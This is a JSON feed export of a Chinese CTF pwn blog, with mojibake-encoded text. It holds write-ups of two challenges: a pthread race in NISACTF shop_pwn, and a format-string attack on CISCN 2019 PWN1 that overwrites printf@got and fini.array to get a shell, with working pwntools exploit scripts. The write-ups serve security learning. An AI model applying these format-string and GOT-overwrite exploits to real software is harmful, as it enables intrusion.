{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"æ ¼å¼åŒ–å­—ç¬¦ä¸²\" tag",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~è¿™é‡Œä¸»è¦ä¼šè®°å½•pwnç¬”è®°ğŸŒ¸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/08/03/pwn1lianxi/",
            "url": "http://example.com/2023/08/03/pwn1lianxi/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"è®°å½•ä¸¤é“pwné¢˜\"><a class=\"markdownIt-Anchor\" href=\"#è®°å½•ä¸¤é“pwné¢˜\">#</a> è®°å½•ä¸¤é“ PWN é¢˜</h1>\n<blockquote>\n<p>ç»™æ–°ç”Ÿå‡ºé¢˜ï¼Œå‡ºç´¯äº†ï¼Œéšä¾¿çœ‹äº†ä¸¤ä¸ª PWN é¢˜ï¼Œå‘ç°è¿™ä¸¤ä¸ª PWN éƒ½å€¼å¾—è®°å½•ä¸€ä¸‹</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>é¢˜ç›®æ ‡ç­¾ï¼š</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180317483.png\" alt=\"image-20230922180317483\"></p>\n<blockquote>\n<p>pthread_create å¤šçº¿ç¨‹ç«äº‰</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180537307.png\" alt=\"image-20230922180537307\"></p>\n<p><strong>æ‰§è¡Œç¨‹åºå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180732045.png\" alt=\"image-20230922180732045\"></p>\n<p><strong>æ”¾å…¥ IDA çœ‹ä¸€ä¸‹å…·ä½“çš„å‡½æ•°ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180849649.png\" alt=\"image-20230922180849649\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ä¸»è¦çš„å‡½æ•°</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181202034.png\" alt=\"image-20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181325444.png\" alt=\"image-20230922181325444\"></p>\n<p><strong>è„šæœ¬å¦‚ä¸‹ï¼š</strong></p>\n<blockquote>\n<p>è¿™é‡Œåˆ©ç”¨äº† pthread_create åˆ›å»ºè¿›ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æŒ‡ä»¤å‘é€å¾—å¿«çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ç¬¬ä¸€æ¬¡å”®å–åŠŸèƒ½æ‰§è¡Œçš„æ—¶å€™æ­£åœ¨ unsleepï¼Œæ¥ç€æ‰§è¡Œç¬¬äºŒæ¬¡å”®å–åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±èƒ½å–å‡ºä¸¤æ¬¡å¾—åˆ°å¯ä»¥è´­ä¹° flag çš„é‡‘é’±äº†</p>\n</blockquote>\n<p><strong>pwntool çš„ sendline å‘é€æŒ‡ä»¤å¾ˆå¿«</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>ç»“æœå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181643187.png\" alt=\"image-20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019è¥¿å—pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019è¥¿å—pwn1\">#</a> [CISCN 2019 è¥¿å—] PWN1</h2>\n<blockquote>\n<p>å½“ <code>RELRO</code>  ä¿æŠ¤ä¸º <code>NO RELRO</code>  çš„æ—¶å€™ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»å¯å†™ï¼›ä¸º <code>PARTIAL RELRO</code>  çš„æ—¶å€™ï¼Œ <code>ini.arrayã€fini.array</code>  å¯è¯»ä¸å¯å†™ï¼Œ <code>got.plt</code>  å¯è¯»å¯å†™ï¼›ä¸º <code>FULL RELRO</code>  æ—¶ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»ä¸å¯å†™ã€‚</p>\n</blockquote>\n<blockquote>\n<p>ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ <code>init.array</code>  æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ <code>fini.array</code>  ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>\n</blockquote>\n<blockquote>\n<p>å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™ <code>fini.array</code>  ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º <code>main</code>  å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ <code>main</code>  å‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º <code>1</code> ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxiimage-20230922182614061.png\" alt=\"image-20230922182614061\"></p>\n<p>32 ä½ç¨‹åºä¿®æ”¹ got è¡¨ã€‚</p>\n<p><strong>æ‰§è¡Œç¨‹åºå‚çœ‹åç§»ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922183714065.png\" alt=\"image-20230922183714065\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184018564.png\" alt=\"image-20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184142420.png\" alt=\"image-20230922184142420\"></p>\n<p><strong>åˆ©ç”¨æ€è·¯ï¼š</strong></p>\n<p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ printf_gotï¼Œä¿®æ”¹ä¸º systemã€‚ä½†æ˜¯ç¨‹åºåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¿®æ”¹å®Œåï¼Œç¨‹åºä¼šé€€å‡ºã€‚</p>\n<p>ä½†æ˜¯å¦‚æœå¦‚ä¸‹å›¾æ‰€ç¤º</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184525768.png\" alt=\"image-20230922184525768\"></p>\n<p>æˆ‘ä»¬å°±å¯ä»¥å»ä¿®æ”¹ <code>fini.array</code> , å°†å…¶å‚æ•° 1ï¼Œç»™è¦†å†™æˆ mainï¼Œé‚£ä¹ˆç¨‹åºåœ¨é€€å‡ºåå°±ä¼šå†æ¬¡æ‰§è¡Œ main å‡½æ•°ã€‚</p>\n<p><strong>payloadï¼š</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>é€šè¿‡ gdb å»çœ‹ä¸€çœ¼ payload è¿›å…¥ç¨‹åºçš„æƒ…å†µï¼š</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922185014496.png\" alt=\"image-20230922185014496\"></p>\n<p>å½“è¯»å…¥ pyload æ—¶çš„æƒ…å†µ</p>\n<p>è¿™æ—¶ç¨‹åºè¯»å…¥ payloadã€‚ç°åœ¨ got è¡¨é¡¹æŒ‡å‘çš„è¿˜æ˜¯ printf_pltã€‚</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922191625014.png\" alt=\"image-20230922191625014\"></p>\n<p>å½“æ‰§è¡Œåˆ° printf å‡½æ•°æ—¶ï¼Œprintf_got ä¿®æ”¹ä¸º system  fini_array çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ä¸º main</p>\n<p>å½“æˆ‘ä»¬ç¨‹åºç»“æŸæ—¶ï¼Œå°±ä¼šå†æ¬¡è·³è½¬åˆ° main å‡½æ•°å…¥å£ï¼Œåœ¨è¯»å…¥ /bin/shï¼Œæ¥ç€ä¼šåœ¨è°ƒç”¨ printf å‡½æ•°ï¼Œä¼šæ‰§è¡Œ system (/bin/sh)ï¼Œä»è€Œè·å– shell</p>\n<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# å¾€fini.array[0]å†™main@text, printf@gotå†™system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n<p><strong>ç»“æœï¼š</strong></p>\n",
            "tags": [
                "æ ¼å¼åŒ–å­—ç¬¦ä¸²",
                "gotè¡¨"
            ]
        }
    ]
}